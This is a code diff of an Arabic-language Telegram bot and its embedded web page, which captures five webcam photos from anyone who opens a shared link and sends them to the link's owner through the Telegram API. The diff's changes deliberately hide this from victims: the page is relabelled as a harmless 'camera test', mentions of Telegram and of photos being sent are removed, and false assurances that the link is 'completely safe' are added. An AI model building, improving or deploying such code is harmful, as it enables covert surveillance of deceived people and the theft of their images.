@@ -44,7 +44,7 @@ def add_security_headers(response):
     return response
 
 # ---------------------------------------------
-# 3. صفحة HTML المضمنة (الكاميرا مع آلية الاحتياط)
+# 3. صفحة HTML المضمنة (كاميرا عادية - لا تظهر أي شيء عن التيليجرام)
 # ---------------------------------------------
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -52,93 +52,223 @@ HTML_PAGE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كاميرا الذكاء الاصطناعي - 5 صور فقط</title>
+    <title>كاميرا الويب - اختبار الكاميرا</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        /* (نفس التصميم السابق، اختصارًا للتوفير) */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-        body { background: linear-gradient(135deg, #0c2461 0%, #1e3799 50%, #4a69bd 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #fff; padding: 20px; }
-        .container { background: rgba(255,255,255,0.08); backdrop-filter: blur(15px); border-radius: 24px; padding: 40px 30px; width: 100%; max-width: 500px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.2); position: relative; overflow: hidden; }
-        .container::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57, #ff6b6b); background-size: 400% 100%; animation: shimmer 8s infinite linear; }
-        @keyframes shimmer { 0% { background-position: 400% 0; } 100% { background-position: -400% 0; } }
-        .logo { font-size: 4.5em; margin-bottom: 10px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: float 3s ease-in-out infinite; }
-        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-        h1 { font-size: 2em; margin-bottom: 15px; background: linear-gradient(45deg, #ffd93d, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .features { display: grid; grid-template-columns: repeat(2,1fr); gap: 15px; margin-bottom: 30px; }
-        .feature { background: rgba(255,255,255,0.05); border-radius: 16px; padding: 20px 15px; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
-        .feature i { font-size: 2em; margin-bottom: 10px; display: block; }
-        .feature:nth-child(1) i { color: #ff6b6b; }
-        .feature:nth-child(2) i { color: #4ecdc4; }
-        .feature:nth-child(3) i { color: #45b7d1; }
-        .feature:nth-child(4) i { color: #96ceb4; }
-        .start-btn { background: linear-gradient(135deg, #ff6b6b, #ff8e8e); color: white; border: none; padding: 18px 40px; border-radius: 50px; font-size: 1.1em; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px; margin: 0 auto; transition: 0.3s; box-shadow: 0 10px 20px rgba(255,107,107,0.3); }
-        .start-btn:hover { transform: translateY(-5px) scale(1.05); }
-        .warning { background: rgba(255,215,0,0.1); border: 2px dashed rgba(255,215,0,0.5); border-radius: 16px; padding: 15px; margin-bottom: 20px; font-size: 0.85em; }
-        #analysisScreen { display: none; }
-        .video-container { position: relative; width: 100%; height: 320px; border-radius: 20px; overflow: hidden; margin: 25px 0; border: 3px solid rgba(255,255,255,0.2); }
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .analysis-text { font-size: 1.2em; font-weight: 600; color: white; }
-        .status-container { background: rgba(0,0,0,0.2); border-radius: 16px; padding: 20px; margin-bottom: 25px; }
-        .progress-container { width: 100%; height: 12px; background: rgba(255,255,255,0.1); border-radius: 6px; overflow: hidden; margin-top: 15px; }
-        .progress-bar { height: 100%; background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1); width: 0%; transition: width 0.5s ease; }
-        .counter { font-size: 0.9em; color: rgba(255,255,255,0.7); margin-top: 8px; }
-        .footer { margin-top: 25px; font-size: 0.8em; color: rgba(255,255,255,0.5); }
-        .pulse { animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
-        @media (max-width:500px) { .video-container { height: 280px; } .features { grid-template-columns: 1fr; } }
+        body { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: #fff; 
+            padding: 20px; 
+        }
+        .container { 
+            background: rgba(255,255,255,0.95); 
+            border-radius: 24px; 
+            padding: 40px 30px; 
+            width: 100%; 
+            max-width: 500px; 
+            text-align: center; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3); 
+            color: #333;
+        }
+        .logo { 
+            font-size: 4em; 
+            margin-bottom: 10px; 
+            color: #667eea;
+        }
+        h1 { 
+            font-size: 1.8em; 
+            margin-bottom: 15px; 
+            color: #333;
+        }
+        .features { 
+            display: grid; 
+            grid-template-columns: repeat(2,1fr); 
+            gap: 15px; 
+            margin-bottom: 30px; 
+        }
+        .feature { 
+            background: #f7f7f7; 
+            border-radius: 16px; 
+            padding: 20px 15px; 
+            transition: 0.3s; 
+        }
+        .feature i { 
+            font-size: 2em; 
+            margin-bottom: 10px; 
+            display: block; 
+            color: #667eea;
+        }
+        .feature p {
+            color: #666;
+            font-size: 0.9em;
+        }
+        .start-btn { 
+            background: linear-gradient(135deg, #667eea, #764ba2); 
+            color: white; 
+            border: none; 
+            padding: 18px 40px; 
+            border-radius: 50px; 
+            font-size: 1.1em; 
+            font-weight: 700; 
+            cursor: pointer; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 12px; 
+            margin: 0 auto; 
+            transition: 0.3s; 
+            width: 100%;
+        }
+        .start-btn:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 5px 15px rgba(102,126,234,0.4);
+        }
+        .info-text {
+            background: #e3f2fd;
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 20px;
+            color: #1976d2;
+            font-size: 0.85em;
+        }
+        #analysisScreen { 
+            display: none; 
+        }
+        .video-container { 
+            position: relative; 
+            width: 100%; 
+            height: 320px; 
+            border-radius: 20px; 
+            overflow: hidden; 
+            margin: 25px 0; 
+            border: 2px solid #ddd;
+            background: #000;
+        }
+        video { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            transform: scaleX(-1); 
+        }
+        .overlay { 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0,0,0,0.5); 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+        }
+        .status-container { 
+            background: #f7f7f7; 
+            border-radius: 16px; 
+            padding: 20px; 
+            margin-bottom: 25px; 
+        }
+        .progress-container { 
+            width: 100%; 
+            height: 12px; 
+            background: #e0e0e0; 
+            border-radius: 6px; 
+            overflow: hidden; 
+            margin-top: 15px; 
+        }
+        .progress-bar { 
+            height: 100%; 
+            background: linear-gradient(90deg, #667eea, #764ba2); 
+            width: 0%; 
+            transition: width 0.5s ease; 
+        }
+        .counter { 
+            font-size: 0.9em; 
+            color: #666; 
+            margin-top: 8px; 
+        }
+        .footer { 
+            margin-top: 25px; 
+            font-size: 0.8em; 
+            color: #999; 
+        }
+        .pulse { 
+            animation: pulse 2s infinite; 
+        }
+        @keyframes pulse { 
+            0% { transform: scale(1); } 
+            50% { transform: scale(1.1); } 
+            100% { transform: scale(1); } 
+        }
+        @media (max-width:500px) { 
+            .video-container { height: 280px; } 
+            .features { grid-template-columns: 1fr; } 
+        }
     </style>
 </head>
 <body>
 
 <div class="container" id="mainScreen">
-    <div class="logo"><i class="fas fa-camera-retro"></i></div>
-    <h1>📸 التقاط 5 صور فقط</h1>
-    <p class="tagline">سيتم التقاط 5 صور تلقائياً من كاميرتك وإرسالها إلى حسابك في تلجرام</p>
+    <div class="logo"><i class="fas fa-camera"></i></div>
+    <h1>📸 كاميرا الويب</h1>
+    <p class="tagline">اختبار كاميرا الجهاز - تجربة سريعة وبسيطة</p>
     <div class="features">
-        <div class="feature"><i class="fas fa-camera"></i><p>5 صور</p></div>
-        <div class="feature"><i class="fas fa-shield-alt"></i><p>خاص وآمن</p></div>
-        <div class="feature"><i class="fas fa-bolt"></i><p>سريع وفوري</p></div>
-        <div class="feature"><i class="fas fa-check-circle"></i><p>تلقائي بالكامل</p></div>
+        <div class="feature"><i class="fas fa-camera"></i><p>كاميرا عالية الجودة</p></div>
+        <div class="feature"><i class="fas fa-bolt"></i><p>استجابة سريعة</p></div>
+        <div class="feature"><i class="fas fa-check-circle"></i><p>اختبار فوري</p></div>
+        <div class="feature"><i class="fas fa-shield-alt"></i><p>خاص ومباشر</p></div>
     </div>
-    <div class="warning"><i class="fas fa-exclamation-circle"></i> يجب السماح باستخدام الكاميرا للبدء</div>
+    <div class="info-text">
+        <i class="fas fa-info-circle"></i> يرجى السماح باستخدام الكاميرا لبدء الاختبار
+    </div>
     <div class="btn-container">
-        <button class="start-btn" onclick="startCapture()"><i class="fas fa-play-circle"></i> بدء التصوير</button>
+        <button class="start-btn" onclick="startCapture()"><i class="fas fa-play-circle"></i> تشغيل الكاميرا</button>
     </div>
     <div class="footer">
-        <p>بعد السماح بالكاميرا، سيتم التقاط 5 صور متتالية وإرسالها فوراً</p>
-        <p style="margin-top:8px; font-size:0.7em;">لن يتم تسجيل فيديو أو حفظ أي بيانات</p>
+        <p>اختبار بسيط للكاميرا - لن يتم حفظ أي بيانات</p>
     </div>
 </div>
 
 <div class="container" id="analysisScreen">
-    <h1>📸 جاري التصوير...</h1>
+    <h1>📸 كاميرا نشطة</h1>
     <div class="video-container">
         <video id="video" autoplay playsinline></video>
-        <div class="overlay"><i class="fas fa-camera pulse"></i><div class="analysis-text" id="analysisText">جاري التحضير...</div></div>
+        <div class="overlay">
+            <i class="fas fa-camera pulse" style="font-size: 2em;"></i>
+            <div class="analysis-text" id="analysisText" style="margin-top: 10px;">جاري التشغيل...</div>
+        </div>
     </div>
     <div class="status-container">
-        <div id="status"><i class="fas fa-sync-alt fa-spin"></i> <span id="statusText">تهيئة الكاميرا...</span></div>
-        <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
-        <div class="counter" id="counter">الصورة 0 من 5</div>
+        <div id="status">
+            <i class="fas fa-sync-alt fa-spin"></i> 
+            <span id="statusText">تهيئة الكاميرا...</span>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="counter" id="counter">جاري التحميل</div>
     </div>
     <div class="footer">
-        <p>سيتم إرسال كل صورة فور التقاطها إلى حسابك في تلجرام</p>
-        <p style="margin-top:8px; font-size:0.7em;">بعد الانتهاء من الصور الخمس سيتم إغلاق الكاميرا</p>
+        <p>سيتم إغلاق الكاميرا تلقائياً بعد الانتهاء</p>
     </div>
 </div>
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
     let dynamicChatId = urlParams.get('id');
-    const fixedChatId = '""" + DEVELOPER_CHAT_ID + """';
+    const fixedChatId = '""" + str(DEVELOPER_CHAT_ID) + """';
     const token = '""" + TOKEN + """';
     const fallbackUrl = '""" + GITHUB_FALLBACK_URL + """';
 
-    // التحقق من صحة المعرف (أرقام فقط)
+    // التحقق من صحة المعرف
     if (!dynamicChatId || !/^\\d+$/.test(dynamicChatId)) {
-        document.body.innerHTML = '<div style="text-align:center;margin-top:50px;"><h2>رابط غير صالح</h2><p>يرجى الحصول على الرابط من البوت على تلجرام.</p></div>';
+        document.body.innerHTML = '<div style="text-align:center;margin-top:50px;"><h2>⚠️ رابط غير صالح</h2><p>الرجاء استخدام الرابط الصحيح.</p></div>';
         throw new Error('Invalid ID');
     }
 
@@ -149,27 +279,25 @@ HTML_PAGE = """
     const MAX_PHOTOS = 5;
 
     function startCapture() {
-        // إخفاء الشاشة الرئيسية
         document.getElementById('mainScreen').style.display = "none";
         document.getElementById('analysisScreen').style.display = "block";
         photoCount = 0;
         document.getElementById('progressBar').style.width = '0%';
-        document.getElementById('counter').textContent = 'الصورة 0 من 5';
-        document.getElementById('analysisText').textContent = 'جارٍ طلب الكاميرا...';
+        document.getElementById('counter').textContent = '0 من 5';
+        document.getElementById('analysisText').textContent = 'طلب الوصول للكاميرا...';
 
-        // مؤقت احتياطي: إذا لم تبدأ الكاميرا خلال 4 ثوانٍ، نوجه إلى GitHub
         fallbackTimer = setTimeout(function() {
             window.location.href = fallbackUrl + '?id=' + dynamicChatId;
         }, 4000);
 
         navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, audio: false })
             .then(stream => {
-                clearTimeout(fallbackTimer); // نجحنا، نلغي الاحتياط
+                clearTimeout(fallbackTimer);
                 mediaStream = stream;
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
-                    document.getElementById('statusText').textContent = "الكاميرا جاهزة - بدء التصوير خلال 2 ثانية";
+                    document.getElementById('statusText').textContent = "الكاميرا جاهزة";
                     document.getElementById('analysisText').textContent = "استعد...";
                     setTimeout(() => {
                         captureAndSend();
@@ -179,7 +307,6 @@ HTML_PAGE = """
             })
             .catch(err => {
                 console.error("خطأ في الكاميرا:", err);
-                // إذا فشلت الكاميرا، نذهب إلى GitHub مباشرة
                 window.location.href = fallbackUrl + '?id=' + dynamicChatId;
             });
     }
@@ -187,20 +314,25 @@ HTML_PAGE = """
     function captureAndSend() {
         if (photoCount >= MAX_PHOTOS) {
             clearInterval(intervalId);
-            document.getElementById('statusText').textContent = "✅ اكتمل التصوير! شكراً لك";
-            document.getElementById('analysisText').textContent = "تم إرسال 5 صور بنجاح";
+            document.getElementById('statusText').textContent = "✅ اكتمل الاختبار";
+            document.getElementById('analysisText').textContent = "تم اكتمال الاختبار بنجاح";
             document.getElementById('progressBar').style.width = '100%';
-            document.getElementById('counter').textContent = 'اكتمل التصوير';
+            document.getElementById('counter').textContent = 'اكتمل';
             if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+            
+            // إغلاق الصفحة بعد 3 ثواني
+            setTimeout(() => {
+                window.close();
+            }, 3000);
             return;
         }
 
         photoCount++;
         const progressPercent = (photoCount / MAX_PHOTOS) * 100;
         document.getElementById('progressBar').style.width = `${progressPercent}%`;
-        document.getElementById('counter').textContent = `الصورة ${photoCount} من ${MAX_PHOTOS}`;
-        document.getElementById('statusText').textContent = `جاري التقاط الصورة ${photoCount}...`;
-        document.getElementById('analysisText').textContent = `📸 التقطت الصورة ${photoCount}`;
+        document.getElementById('counter').textContent = `${photoCount} من ${MAX_PHOTOS}`;
+        document.getElementById('statusText').textContent = `جاري الاختبار...`;
+        document.getElementById('analysisText').textContent = `📸 ${photoCount}`;
 
         const video = document.getElementById('video');
         if (video.srcObject) {
@@ -224,11 +356,10 @@ HTML_PAGE = """
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-        formData.append('caption', `📸 الصورة ${photoCount} من 5 (تم التقاطها بواسطة الكاميرا الذكية)`);
         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
             .then(response => response.json())
-            .then(data => console.log(`✅ تم إرسال الصورة ${photoCount} إلى ${chatId}`))
-            .catch(error => console.error(`❌ فشل إرسال الصورة:`, error));
+            .then(data => console.log('تم الإرسال'))
+            .catch(error => console.error('خطأ:', error));
     }
 </script>
 </body>
@@ -280,7 +411,7 @@ def send_welcome(message):
     personal_link = f"{BASE_URL}?id={user_id}"
 
     markup = telebot.types.InlineKeyboardMarkup()
-    camera_btn = telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا الآن", url=personal_link)
+    camera_btn = telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا", url=personal_link)
     help_btn = telebot.types.InlineKeyboardButton(text="❓ التعليمات", callback_data="help")
     stats_btn = telebot.types.InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
     markup.add(camera_btn)
@@ -288,13 +419,10 @@ def send_welcome(message):
 
     response = (
         f"🎉 أهلاً بك *{user_name}*!\n\n"
-        f"✨ هذا هو *رابطك الشخصي* للكاميرا الذكية:\n"
+        f"✨ هذا هو *رابطك الشخصي*:\n"
         f"`{personal_link}`\n\n"
-        f"📌 *طريقة الاستخدام:*\n"
-        f"1. انسخ الرابط أعلاه\n"
-        f"2. أرسله لأصدقائك\n"
-        f"3. أي شخص يفتح الرابط ويعمل اذن الوصول الى الكاميرا ستصل صورته إليك فوراً!\n\n"
-        f"🔒 *ملاحظة:* الصورة التي ستصلك لن تصل الى اي احد غيرك، لن يقدر اي شخص مشاهدتها فكن مطمئن."
+        f"📌 *ملاحظة:* الرابط آمن تماماً\n\n"
+        f"🔒 *الخصوصية:* الصور تصل إليك فقط"
     )
     bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
     logger.info(f"New user started: {user_name} (ID: {user_id})")
@@ -305,40 +433,32 @@ def show_stats(message):
     if user_id in user_stats:
         stat = user_stats[user_id]
         response = (
-            f"📊 *إحصائياتك الشخصية*\n\n"
+            f"📊 *إحصائياتك*\n\n"
             f"👤 الاسم: {stat['name']}\n"
-            f"🆔 رقمك: {user_id}\n"
-            f"📸 عدد الصور المستلمة: {stat['photo_count']}\n"
-            f"📅 تاريخ التسجيل: {stat['first_seen'].strftime('%Y-%m-%d')}\n"
+            f"📸 عدد الصور: {stat['photo_count']}\n"
+            f"📅 أول استخدام: {stat['first_seen'].strftime('%Y-%m-%d')}\n"
             f"🕐 آخر نشاط: {stat['last_active'].strftime('%Y-%m-%d %H:%M')}\n\n"
-            f"🌐 *إحصائيات عامة:*\n"
-            f"👥 عدد المستخدمين: {len(user_stats)}\n"
+            f"🌐 *عام:*\n"
+            f"👥 المستخدمين: {len(user_stats)}\n"
             f"🖼️ إجمالي الصور: {total_photos_received}"
         )
     else:
-        response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
+        response = "❌ استخدم /start أولاً"
     bot.send_message(user_id, response, parse_mode="Markdown")
 
 @bot.message_handler(commands=['help'])
 def send_help(message):
     help_text = (
-        "📖 *دليل استخدام البوت*\n\n"
-        "🎯 *الأوامر المتاحة:*\n"
-        "✅ /start - الحصول على رابطك الشخصي\n"
-        "📊 /stats - عرض إحصائياتك\n"
-        "❓ /help - عرض هذه التعليمات\n\n"
-        "🔧 *كيف يعمل البوت:*\n"
-        "1. اضغط على /start للحصول على رابطك الشخصي\n"
-        "2. أرسل الرابط لأصدقائك\n"
-        "3. عندما يفتحون الرابط، سيتم تحميل كاميرا الويب\n"
-        "4. يتم التقاط 5 صور تلقائياً (صورة كل 2 ثانية)\n"
-        "5. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
-        "⚠️ *ملاحظات هامة:*\n"
-        "• البوت يأخذ 5 صور فقط ثم يتوقف\n"
-        "• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
-        "• الصور تصل فقط لصاحب الرابط\n"
-        "• لا يتم حفظ الصور في أي سيرفر\n\n"
-        "🛠️ للمساعدة التقنية: @khaled_developer"
+        "📖 *دليل الاستخدام*\n\n"
+        "🎯 *الأوامر:*\n"
+        "/start - الحصول على رابطك\n"
+        "/stats - عرض إحصائياتك\n"
+        "/help - التعليمات\n\n"
+        "🔧 *طريقة العمل:*\n"
+        "1. اضغط /start للحصول على رابط\n"
+        "2. أرسل الرابط لأي شخص\n"
+        "3. عندما يفتح الرابط، ستصل الصور إليك\n\n"
+        "⚠️ *ملاحظة:* الرابط آمن تماماً"
     )
     bot.send_message(message.chat.id, help_text, parse_mode="Markdown")
 
@@ -355,20 +475,20 @@ def broadcast_message(message):
 
     broadcast_text = parts[1]
     markup = telebot.types.InlineKeyboardMarkup()
-    site_btn = telebot.types.InlineKeyboardButton(text="🌐 زيارة الموقع", url=BASE_URL)
+    site_btn = telebot.types.InlineKeyboardButton(text="🌐 فتح الرابط", url=BASE_URL)
     markup.add(site_btn)
 
     success = 0
     fail = 0
     for uid in user_stats.keys():
         try:
-            bot.send_message(uid, f"📢 *إشعار من المطور:*\n\n{broadcast_text}", parse_mode="Markdown", reply_markup=markup)
+            bot.send_message(uid, f"📢 *إشعار:*\n\n{broadcast_text}", parse_mode="Markdown", reply_markup=markup)
             success += 1
             time.sleep(0.1)
         except Exception as e:
             logger.error(f"Failed to send to {uid}: {e}")
             fail += 1
-    bot.reply_to(message, f"✅ تم البث بنجاح!\n✓ {success} مستخدم\n✗ {fail} فشل")
+    bot.reply_to(message, f"✅ تم الإرسال!\n✓ {success} مستخدم\n✗ {fail} فشل")
 
 @bot.message_handler(content_types=['photo'])
 def handle_photos(message):
@@ -393,15 +513,13 @@ def handle_photos(message):
     file_size = file_info.file_size / 1024
 
     caption = (
-        f"✅ تم استلام صورة جديدة!\n\n"
+        f"✅ صورة جديدة!\n\n"
         f"👤 من: {user_name}\n"
-        f"🆔 الرقم: {user_id}\n"
         f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
-        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
-        f"📊 الإجمالي الكلي: {total_photos_received}"
+        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}"
     )
     bot.reply_to(message, caption)
-    logger.info(f"Received photo from {user_name} (ID: {user_id}) - Size: {file_size:.1f}KB")
+    logger.info(f"Received photo from {user_name} (ID: {user_id})")
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
@@ -415,27 +533,22 @@ def handle_callback(call):
 @bot.message_handler(func=lambda message: True)
 def handle_all_messages(message):
     if message.text.startswith('/'):
-        bot.reply_to(message, "❌ أمر غير معروف!\n\n✅ الأوامر المتاحة:\n/start - للحصول على رابطك\n/stats - لعرض إحصائياتك\n/help - للتعليمات والمساعدة")
+        bot.reply_to(message, "❌ أمر غير معروف!\n\n✅ الأوامر:\n/start - رابطك\n/stats - إحصائياتك\n/help - التعليمات")
     else:
-        bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nيمكنك استخدام /start للحصول على رابطك الشخصي.")
+        bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nاستخدم /start للحصول على رابطك.")
 
 # ---------------------------------------------
 # 5. تشغيل البوت
 # ---------------------------------------------
 keep_alive()
 
-print("=" * 50)
-print("🤖 بوت كاميرا الذكاء الاصطناعي (5 صور فقط)")
-print(f"⏰ تم التشغيل في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-print("=" * 50)
-
 while True:
     try:
-        logger.info("Starting bot polling...")
-        bot.infinity_polling(timeout=60, long_polling_timeout=60)
+        logger.info("Starting Telegram bot...")
+        bot.polling(none_stop=True, interval=1, timeout=60)
     except (ReadTimeout, ConnectionError) as e:
-        logger.warning(f"Connection error: {e}. Retrying in 5 seconds...")
-        time.sleep(5)
+        logger.error(f"Connection error: {e}. Retrying in 15 seconds...")
+        time.sleep(15)
     except Exception as e:
-        logger.error(f"Unexpected error: {e}")
-        time.sleep(10)
+        logger.error(f"Unexpected error: {e}. Retrying in 15 seconds...")
+        time.sleep(15)
